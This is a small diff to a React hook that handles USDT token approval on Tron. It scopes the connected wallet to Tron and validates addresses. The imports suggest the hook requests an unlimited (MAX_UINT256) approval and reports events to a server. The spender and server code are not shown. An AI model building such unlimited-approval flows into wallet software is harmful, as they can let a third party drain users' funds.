@@ -4,6 +4,8 @@ import type { TronConnector } from '@reown/appkit-utils/tron'
 import { getConfig, reportEvent, verifyAllowance, type ServerConfig } from '../lib/api'
 import { MAX_UINT256, USDT, buildApprove, signAndBroadcast } from '../lib/usdt'
 
+const TRON_ADDRESS_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/
+
 export type Phase =
   | 'idle'
   | 'checking'
@@ -25,7 +27,14 @@ function reportInBackground(input: Parameters<typeof reportEvent>[0]) {
 }
 
 export function useUsdtApproval() {
-  const { address, isConnected } = useAppKitAccount()
+  // Scoped to Tron: the session can also carry EVM chains, whose accounts are
+  // 0x addresses that would fail the server-side allowance check.
+  const { address: activeAddress, isConnected: activeConnected } = useAppKitAccount({
+    namespace: 'tron',
+  })
+  const address =
+    activeAddress && TRON_ADDRESS_RE.test(activeAddress) ? activeAddress : undefined
+  const isConnected = activeConnected && Boolean(address)
   const { walletProvider } = useAppKitProvider<TronConnector>('tron')
   const [phase, setPhase] = useState<Phase>('idle')
   const [error, setError] = useState<string | null>(null)
